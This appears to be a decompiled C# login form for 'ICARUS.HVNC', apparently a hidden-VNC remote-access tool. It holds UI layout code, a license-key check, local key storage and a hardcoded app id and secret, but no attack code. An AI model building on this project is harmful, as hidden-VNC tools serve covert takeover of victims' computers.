// ICARUS.HVNC.Login

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ICARUS.HVNC.Controls.HVNC.Controls.Renderers;

namespace ICARUS.HVNC
{
    public class Login : Form
    {
        public string Keys = string.Empty;

        private IContainer components;

        private static readonly string name;

        private static readonly string ICARUSid;

        private static readonly string ICARUSmystic;

        private static readonly string version;

        public static Phychedelic trance;

        private PrimeTheme primeTheme1;

        private Label label3;

        private PictureBox pictureBox1;

        private StudioButton studioButton5;

        private StudioButton studioButton4;

        private PrimeButton primeButton2;

        private PrimeButton primeButton1;

        private TextBox txtKey;

        private PictureBox pictureBox2;

        private Label label1;

        private JCS.ToggleSwitch chkSave;

        private Label label5;

        private Label status;

        private Button button1;

        public Login()
        {
            InitializeComponent();
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void studioButton4_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void primeButton2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void primeButton1_Click(object sender, EventArgs e)
        {
            trance.license(txtKey.Text);
            new Thread((ThreadStart)delegate
            {
                if (trance.response.success)
                {
                    if (chkSave.Checked && !File.Exists(Application.StartupPath + "\\LocalUser"))
                    {
                        Directory.CreateDirectory(Application.StartupPath + "\\LocalUser");
                        File.WriteAllText(contents: txtKey.Text, path: Application.StartupPath + "\\LocalUser\\Key.ini");
                    }
                    Hide();
                }
                else
                {
                    status.Text = "Status: " + trance.response.message;
                }
            }).Start();
        }

        private void Login_FormClosed(object sender, FormClosedEventArgs e)
        {
            Application.Exit();
        }

        private void Login_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }

        private void Login_Load(object sender, EventArgs e)
        {
            txtKey.UseSystemPasswordChar = true;
            trance.init();
            if (File.Exists(Application.StartupPath + "\\LocalUser\\Key.ini"))
            {
                chkSave.Checked = true;
                using (StreamReader streamReader = new StreamReader(Application.StartupPath + "\\LocalUser\\Key.ini"))
                {
                    if (!string.IsNullOrWhiteSpace(streamReader.ReadToEnd()))
                    {
                        Keys = File.ReadAllText(Application.StartupPath + "\\LocalUser\\Key.ini");
                        txtKey.Text = Keys;
                        streamReader.Dispose();
                    }
                }
                button1.PerformClick();
            }
            if (trance.checkblack())
            {
                Environment.Exit(0);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            trance.license(txtKey.Text);
            if (trance.response.success)
            {
                if (chkSave.Checked && !File.Exists(Application.StartupPath + "\\LocalUser"))
                {
                    Directory.CreateDirectory(Application.StartupPath + "\\LocalUser");
                    File.WriteAllText(contents: "Key|" + txtKey.Text, path: Application.StartupPath + "\\LocalUser\\Key.ini");
                }
                Hide();
            }
            else
            {
                status.Text = "Status: " + trance.response.message;
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            Bloom bloom = new Bloom();
            Bloom bloom12 = new Bloom();
            Bloom bloom23 = new Bloom();
            Bloom bloom34 = new Bloom();
            Bloom bloom45 = new Bloom();
            Bloom bloom55 = new Bloom();
            Bloom bloom56 = new Bloom();
            Bloom bloom57 = new Bloom();
            Bloom bloom58 = new Bloom();
            Bloom bloom2 = new Bloom();
            ComponentResourceManager resources = new ComponentResourceManager(typeof(Login));
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            Bloom bloom11 = new Bloom();
            Bloom bloom13 = new Bloom();
            Bloom bloom14 = new Bloom();
            Bloom bloom15 = new Bloom();
            Bloom bloom16 = new Bloom();
            Bloom bloom17 = new Bloom();
            Bloom bloom18 = new Bloom();
            Bloom bloom19 = new Bloom();
            Bloom bloom20 = new Bloom();
            Bloom bloom21 = new Bloom();
            Bloom bloom22 = new Bloom();
            Bloom bloom24 = new Bloom();
            Bloom bloom25 = new Bloom();
            Bloom bloom26 = new Bloom();
            Bloom bloom27 = new Bloom();
            Bloom bloom28 = new Bloom();
            Bloom bloom29 = new Bloom();
            Bloom bloom30 = new Bloom();
            Bloom bloom31 = new Bloom();
            Bloom bloom32 = new Bloom();
            Bloom bloom33 = new Bloom();
            Bloom bloom35 = new Bloom();
            Bloom bloom36 = new Bloom();
            Bloom bloom37 = new Bloom();
            Bloom bloom38 = new Bloom();
            Bloom bloom39 = new Bloom();
            Bloom bloom40 = new Bloom();
            Bloom bloom41 = new Bloom();
            Bloom bloom42 = new Bloom();
            Bloom bloom43 = new Bloom();
            Bloom bloom44 = new Bloom();
            Bloom bloom46 = new Bloom();
            Bloom bloom47 = new Bloom();
            Bloom bloom48 = new Bloom();
            Bloom bloom49 = new Bloom();
            Bloom bloom50 = new Bloom();
            Bloom bloom51 = new Bloom();
            Bloom bloom52 = new Bloom();
            Bloom bloom53 = new Bloom();
            Bloom bloom54 = new Bloom();
            primeTheme1 = new PrimeTheme();
            button1 = new Button();
            status = new Label();
            label5 = new Label();
            chkSave = new JCS.ToggleSwitch();
            pictureBox2 = new PictureBox();
            label1 = new Label();
            txtKey = new TextBox();
            primeButton2 = new PrimeButton();
            primeButton1 = new PrimeButton();
            label3 = new Label();
            pictureBox1 = new PictureBox();
            studioButton5 = new StudioButton();
            studioButton4 = new StudioButton();
            primeTheme1.SuspendLayout();
            ((ISupportInitialize)pictureBox2).BeginInit();
            ((ISupportInitialize)pictureBox1).BeginInit();
            SuspendLayout();
            primeTheme1.BackColor = Color.White;
            primeTheme1.BorderStyle = FormBorderStyle.None;
            bloom.Name = "Sides";
            bloom.Value = Color.FromArgb(232, 232, 232);
            bloom12.Name = "Gradient1";
            bloom12.Value = Color.FromArgb(252, 252, 252);
            bloom23.Name = "Gradient2";
            bloom23.Value = Color.FromArgb(242, 242, 242);
            bloom34.Name = "TextShade";
            bloom34.Value = Color.White;
            bloom45.Name = "Text";
            bloom45.Value = Color.FromArgb(80, 80, 80);
            bloom55.Name = "Back";
            bloom55.Value = Color.White;
            bloom56.Name = "Border1";
            bloom56.Value = Color.FromArgb(180, 180, 180);
            bloom57.Name = "Border2";
            bloom57.Value = Color.White;
            bloom58.Name = "Border3";
            bloom58.Value = Color.White;
            bloom2.Name = "Border4";
            bloom2.Value = Color.FromArgb(150, 150, 150);
            primeTheme1.Colors = new Bloom[10] { bloom, bloom12, bloom23, bloom34, bloom45, bloom55, bloom56, bloom57, bloom58, bloom2 };
            primeTheme1.Controls.Add(button1);
            primeTheme1.Controls.Add(status);
            primeTheme1.Controls.Add(label5);
            primeTheme1.Controls.Add(chkSave);
            primeTheme1.Controls.Add(pictureBox2);
            primeTheme1.Controls.Add(label1);
            primeTheme1.Controls.Add(txtKey);
            primeTheme1.Controls.Add(primeButton2);
            primeTheme1.Controls.Add(primeButton1);
            primeTheme1.Controls.Add(label3);
            primeTheme1.Controls.Add(pictureBox1);
            primeTheme1.Controls.Add(studioButton5);
            primeTheme1.Controls.Add(studioButton4);
            primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            primeTheme1.Dock = DockStyle.Fill;
            primeTheme1.Font = new Font("Verdana", 8f);
            primeTheme1.Image = null;
            primeTheme1.Location = new Point(0, 0);
            primeTheme1.Movable = true;
            primeTheme1.Name = "primeTheme1";
            primeTheme1.NoRounding = false;
            primeTheme1.Sizable = true;
            primeTheme1.Size = new Size(548, 315);
            primeTheme1.SmartBounds = true;
            primeTheme1.TabIndex = 0;
            primeTheme1.TransparencyKey = Color.Fuchsia;
            button1.Location = new Point(242, 192);
            button1.Name = "button1";
            button1.Size = new Size(35, 23);
            button1.TabIndex = 53;
            button1.UseVisualStyleBackColor = true;
            button1.Visible = false;
            button1.Click += new EventHandler(button1_Click);
            status.AutoSize = true;
            status.BackColor = Color.Transparent;
            status.Font = new Font("Verdana", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            status.Location = new Point(19, 285);
            status.Name = "status";
            status.Size = new Size(48, 13);
            status.TabIndex = 52;
            status.Text = "Status";
            status.Visible = false;
            label5.AutoSize = true;
            label5.Location = new Point(200, 197);
            label5.Name = "label5";
            label5.Size = new Size(36, 13);
            label5.TabIndex = 51;
            label5.Text = "Save";
            chkSave.BackColor = Color.Transparent;
            chkSave.Location = new Point(144, 192);
            chkSave.Name = "chkSave";
            chkSave.OffFont = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            chkSave.OnFont = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            chkSave.Size = new Size(50, 19);
            chkSave.Style = JCS.ToggleSwitch.ToggleSwitchStyle.BrushedMetal;
            chkSave.TabIndex = 50;
            pictureBox2.Image = (Image)resources.GetObject("pictureBox2.Image");
            pictureBox2.Location = new Point(31, 87);
            pictureBox2.Name = "pictureBox2";
            pictureBox2.Size = new Size(103, 99);
            pictureBox2.TabIndex = 49;
            pictureBox2.TabStop = false;
            label1.AutoSize = true;
            label1.BackColor = Color.Transparent;
            label1.Font = new Font("Verdana", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            label1.Location = new Point(141, 141);
            label1.Name = "label1";
            label1.Size = new Size(35, 13);
            label1.TabIndex = 48;
            label1.Text = "Key:";
            txtKey.Location = new Point(141, 157);
            txtKey.Multiline = true;
            txtKey.Name = "txtKey";
            txtKey.Size = new Size(376, 29);
            txtKey.TabIndex = 47;
            bloom3.Name = "DownGradient1";
            bloom3.Value = Color.FromArgb(215, 215, 215);
            bloom4.Name = "DownGradient2";
            bloom4.Value = Color.FromArgb(235, 235, 235);
            bloom5.Name = "NoneGradient1";
            bloom5.Value = Color.FromArgb(235, 235, 235);
            bloom6.Name = "NoneGradient2";
            bloom6.Value = Color.FromArgb(215, 215, 215);
            bloom7.Name = "NoneGradient3";
            bloom7.Value = Color.FromArgb(252, 252, 252);
            bloom8.Name = "NoneGradient4";
            bloom8.Value = Color.FromArgb(242, 242, 242);
            bloom9.Name = "Glow";
            bloom9.Value = Color.FromArgb(50, 255, 255, 255);
            bloom10.Name = "TextShade";
            bloom10.Value = Color.White;
            bloom11.Name = "Text";
            bloom11.Value = Color.FromArgb(80, 80, 80);
            bloom13.Name = "Border1";
            bloom13.Value = Color.White;
            bloom14.Name = "Border2";
            bloom14.Value = Color.FromArgb(180, 180, 180);
            primeButton2.Colors = new Bloom[11]
            {
                bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10, bloom11, bloom13,
                bloom14
            };
            primeButton2.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            primeButton2.Font = new Font("Verdana", 8f);
            primeButton2.Image = null;
            primeButton2.Location = new Point(31, 229);
            primeButton2.Name = "primeButton2";
            primeButton2.NoRounding = false;
            primeButton2.Size = new Size(126, 48);
            primeButton2.TabIndex = 42;
            primeButton2.Text = "Exit";
            primeButton2.Transparent = false;
            primeButton2.Click += new EventHandler(primeButton2_Click);
            bloom15.Name = "DownGradient1";
            bloom15.Value = Color.FromArgb(215, 215, 215);
            bloom16.Name = "DownGradient2";
            bloom16.Value = Color.FromArgb(235, 235, 235);
            bloom17.Name = "NoneGradient1";
            bloom17.Value = Color.FromArgb(235, 235, 235);
            bloom18.Name = "NoneGradient2";
            bloom18.Value = Color.FromArgb(215, 215, 215);
            bloom19.Name = "NoneGradient3";
            bloom19.Value = Color.FromArgb(252, 252, 252);
            bloom20.Name = "NoneGradient4";
            bloom20.Value = Color.FromArgb(242, 242, 242);
            bloom21.Name = "Glow";
            bloom21.Value = Color.FromArgb(50, 255, 255, 255);
            bloom22.Name = "TextShade";
            bloom22.Value = Color.White;
            bloom24.Name = "Text";
            bloom24.Value = Color.FromArgb(80, 80, 80);
            bloom25.Name = "Border1";
            bloom25.Value = Color.White;
            bloom26.Name = "Border2";
            bloom26.Value = Color.FromArgb(180, 180, 180);
            primeButton1.Colors = new Bloom[11]
            {
                bloom15, bloom16, bloom17, bloom18, bloom19, bloom20, bloom21, bloom22, bloom24, bloom25,
                bloom26
            };
            primeButton1.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            primeButton1.Font = new Font("Verdana", 8f);
            primeButton1.Image = null;
            primeButton1.Location = new Point(391, 229);
            primeButton1.Name = "primeButton1";
            primeButton1.NoRounding = false;
            primeButton1.Size = new Size(126, 48);
            primeButton1.TabIndex = 41;
            primeButton1.Text = "Login";
            primeButton1.Transparent = false;
            primeButton1.Click += new EventHandler(primeButton1_Click);
            label3.AutoSize = true;
            label3.BackColor = Color.Transparent;
            label3.Font = new Font("Verdana", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            label3.Location = new Point(39, 14);
            label3.Name = "label3";
            label3.Size = new Size(42, 13);
            label3.TabIndex = 40;
            label3.Text = "Login";
            pictureBox1.BackColor = Color.Transparent;
            pictureBox1.Image = (Image)resources.GetObject("pictureBox1.Image");
            pictureBox1.Location = new Point(3, -1);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new Size(42, 40);
            pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            pictureBox1.TabIndex = 39;
            pictureBox1.TabStop = false;
            studioButton5.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            studioButton5.BackColor = Color.Transparent;
            bloom27.Name = "DownGradient1";
            bloom27.Value = Color.FromArgb(45, 65, 95);
            bloom28.Name = "DownGradient2";
            bloom28.Value = Color.FromArgb(65, 85, 115);
            bloom29.Name = "NoneGradient1";
            bloom29.Value = Color.FromArgb(65, 85, 115);
            bloom30.Name = "NoneGradient2";
            bloom30.Value = Color.FromArgb(45, 65, 95);
            bloom31.Name = "Shine1";
            bloom31.Value = Color.FromArgb(30, 255, 255, 255);
            bloom32.Name = "Shine2A";
            bloom32.Value = Color.FromArgb(30, 255, 255, 255);
            bloom33.Name = "Shine2B";
            bloom33.Value = Color.Transparent;
            bloom35.Name = "Shine3";
            bloom35.Value = Color.FromArgb(20, 255, 255, 255);
            bloom36.Name = "TextShade";
            bloom36.Value = Color.FromArgb(50, 0, 0, 0);
            bloom37.Name = "Text";
            bloom37.Value = Color.White;
            bloom38.Name = "Glow";
            bloom38.Value = Color.FromArgb(10, 255, 255, 255);
            bloom39.Name = "Border";
            bloom39.Value = Color.FromArgb(20, 40, 70);
            bloom40.Name = "Corners";
            bloom40.Value = Color.FromArgb(20, 40, 70);
            studioButton5.Colors = new Bloom[13]
            {
                bloom27, bloom28, bloom29, bloom30, bloom31, bloom32, bloom33, bloom35, bloom36, bloom37,
                bloom38, bloom39, bloom40
            };
            studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            studioButton5.Font = new Font("Verdana", 8f);
            studioButton5.Image = null;
            studioButton5.Location = new Point(523, -4);
            studioButton5.Name = "studioButton5";
            studioButton5.NoRounding = false;
            studioButton5.Size = new Size(13, 30);
            studioButton5.TabIndex = 38;
            studioButton5.Transparent = true;
            studioButton5.Click += new EventHandler(studioButton5_Click);
            studioButton4.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            studioButton4.BackColor = Color.Transparent;
            bloom41.Name = "DownGradient1";
            bloom41.Value = Color.FromArgb(45, 65, 95);
            bloom42.Name = "DownGradient2";
            bloom42.Value = Color.FromArgb(65, 85, 115);
            bloom43.Name = "NoneGradient1";
            bloom43.Value = Color.FromArgb(65, 85, 115);
            bloom44.Name = "NoneGradient2";
            bloom44.Value = Color.FromArgb(45, 65, 95);
            bloom46.Name = "Shine1";
            bloom46.Value = Color.FromArgb(30, 255, 255, 255);
            bloom47.Name = "Shine2A";
            bloom47.Value = Color.FromArgb(30, 255, 255, 255);
            bloom48.Name = "Shine2B";
            bloom48.Value = Color.Transparent;
            bloom49.Name = "Shine3";
            bloom49.Value = Color.FromArgb(20, 255, 255, 255);
            bloom50.Name = "TextShade";
            bloom50.Value = Color.FromArgb(50, 0, 0, 0);
            bloom51.Name = "Text";
            bloom51.Value = Color.White;
            bloom52.Name = "Glow";
            bloom52.Value = Color.FromArgb(10, 255, 255, 255);
            bloom53.Name = "Border";
            bloom53.Value = Color.FromArgb(20, 40, 70);
            bloom54.Name = "Corners";
            bloom54.Value = Color.FromArgb(20, 40, 70);
            studioButton4.Colors = new Bloom[13]
            {
                bloom41, bloom42, bloom43, bloom44, bloom46, bloom47, bloom48, bloom49, bloom50, bloom51,
                bloom52, bloom53, bloom54
            };
            studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            studioButton4.Font = new Font("Verdana", 8f);
            studioButton4.Image = null;
            studioButton4.Location = new Point(504, -4);
            studioButton4.Name = "studioButton4";
            studioButton4.NoRounding = false;
            studioButton4.Size = new Size(13, 30);
            studioButton4.TabIndex = 37;
            studioButton4.Transparent = true;
            studioButton4.Click += new EventHandler(studioButton4_Click);
            AutoScaleDimensions = new SizeF(6f, 13f);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(548, 315);
            Controls.Add(primeTheme1);
            FormBorderStyle = FormBorderStyle.None;
            Icon = (Icon)resources.GetObject("$this.Icon");
            Name = "Login";
            StartPosition = FormStartPosition.CenterScreen;
            Text = "Login";
            TransparencyKey = Color.Fuchsia;
            Load += new EventHandler(Login_Load);
            primeTheme1.ResumeLayout(false);
            primeTheme1.PerformLayout();
            ((ISupportInitialize)pictureBox2).EndInit();
            ((ISupportInitialize)pictureBox1).EndInit();
            ResumeLayout(false);
        }

        static Login()
        {
            name = "demoapp";
            ICARUSid = "rZsbifQeLf";
            ICARUSmystic = "9054b01a394c8ea7c6e650f7e5d762eaff6955e728be1cdacd6189332942a5bf";
            version = "1.0";
            trance = new Phychedelic(name, ICARUSid, ICARUSmystic, version);
        }
    }
}